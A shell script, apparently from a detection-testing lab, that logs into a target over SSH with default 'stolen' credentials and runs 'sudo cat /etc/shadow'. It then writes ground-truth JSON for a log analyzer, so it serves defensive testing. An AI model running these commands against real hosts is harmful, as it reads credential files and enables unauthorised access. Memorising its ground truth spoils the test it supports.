#!/bin/sh
# 01_unauthorized_login_remote.sh — MITRE T1078 Valid Accounts / T1021.004 SSH,
# performed FOR REAL from the attacker box against LFA_TARGET.
#
# WHAT IT DOES
#   Logs in over SSH with the valid 'stolen' credentials and immediately runs a
#   privileged command via sudo. The target's sshd/PAM record a genuine
#   'Accepted password' from your real IP, and sudo records a genuine privileged
#   action — no injection anywhere. This is the single most common real breach:
#   a login that is technically authorised but is not YOU.
#
# GENUINE vs SIMULATED
#   The login, the source IP and the sudo action are 100% GENUINE. The one thing
#   you cannot set from the attacker side is the target's CLOCK — so whether this
#   reads as "off hours" depends on the target's local time when you run it.
#
# WHAT THE ANALYZER SHOULD FIND (after you collect + analyse the TARGET)
#   off_hours_privileged  — a FINDING, but only if the sudo lands OUTSIDE the
#     target's 08:00–18:00 local business hours. Run it off-hours, OR set the
#     target clock (sudo date -u -s ...) to an off-hours time first. In hours,
#     the privileged action is still on the timeline as EVIDENCE, just not a
#     finding — which is honest, not a miss.
#   successful_login       — timeline evidence for your source IP.
#
# CONFIG (env)
#   LFA_TARGET      target host/IP                        (REQUIRED)
#   LFA_SSH_PORT    ssh port                              (default 22)
#   LFA_VALID_USER/LFA_VALID_PASS   the valid credentials (default msfadmin/msfadmin)
#   LFA_PRIV_CMD    privileged command to run via sudo    (default: cat /etc/shadow)
#
# EXAMPLE
#   LFA_TARGET=192.168.56.101 sh 01_unauthorized_login_remote.sh

set -e
DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
. "$DIR/lib_remote.sh"
need_target "01_unauthorized_login_remote.sh"
confirm_authorized
require_sshpass

PRIV_CMD="${LFA_PRIV_CMD:-cat /etc/shadow}"
SRC=$(attacker_ip); [ -n "$SRC" ] || SRC="your source IP"

echo "[*] Unauthorized login as '$LFA_VALID_USER' to $LFA_TARGET:$LFA_SSH_PORT (source $SRC)..."
# Run the privileged command with sudo, feeding the password on stdin (-S) and
# clearing any cached credential (-k) so a real 'sudo' auth event is recorded.
REMOTE="echo '$LFA_VALID_PASS' | sudo -S -k $PRIV_CMD >/dev/null 2>&1; \
        echo LFA_SUDO_RC=\$?; id"
if ssh_attempt "$LFA_VALID_USER" "$LFA_VALID_PASS" "$REMOTE"; then
    echo "    logged in and ran 'sudo $PRIV_CMD' (real Accepted password + sudo on the target)."
else
    echo "    [!] login failed — set LFA_VALID_USER / LFA_VALID_PASS to real target credentials."
    exit 1
fi

# Is the target currently inside business hours? Tell the operator whether
# off_hours_privileged will fire, without guessing on their behalf.
TZTIME=$(ssh_attempt "$LFA_VALID_USER" "$LFA_VALID_PASS" 'date +%H' 2>/dev/null | tr -dc '0-9')
if [ -n "$TZTIME" ]; then
    if [ "$TZTIME" -ge 8 ] && [ "$TZTIME" -lt 18 ]; then
        echo "    [i] Target local hour is $TZTIME (business hours 08–18): the sudo is"
        echo "        EVIDENCE now, not a finding. Re-run off-hours or set the target clock"
        echo "        for off_hours_privileged to fire."
    else
        echo "    [i] Target local hour is $TZTIME (outside 08–18): off_hours_privileged should fire."
    fi
fi

write_ground_truth_remote "$DIR/01_unauthorized_login_remote.ground_truth.json" \
  "unauthorized_login_remote" \
  "[
    {\"threat_id\":\"T1078_offhours_login\",\"name\":\"Off-hours privileged action via stolen creds\",
     \"expected_rule\":\"off_hours_privileged\",\"detection_layer\":\"finding\",
     \"details\":\"sudo $PRIV_CMD by $LFA_VALID_USER from the attacker IP; fires only if run outside the target's 08–18 local hours\",
     \"verify\":\"grep -E 'sudo:.*$LFA_VALID_USER' /var/log/auth.log\"},
    {\"threat_id\":\"T1021_ssh_accepted\",\"name\":\"Accepted SSH password from the attacker IP\",
     \"expected_rule\":null,\"detection_layer\":\"evidence\",
     \"details\":\"successful_login event for $LFA_VALID_USER from the attacker source IP\",
     \"verify\":\"grep 'Accepted password' /var/log/auth.log; last -a | head\"}
  ]"
echo "[+] Scenario 01 (remote) complete. Collect the TARGET next."
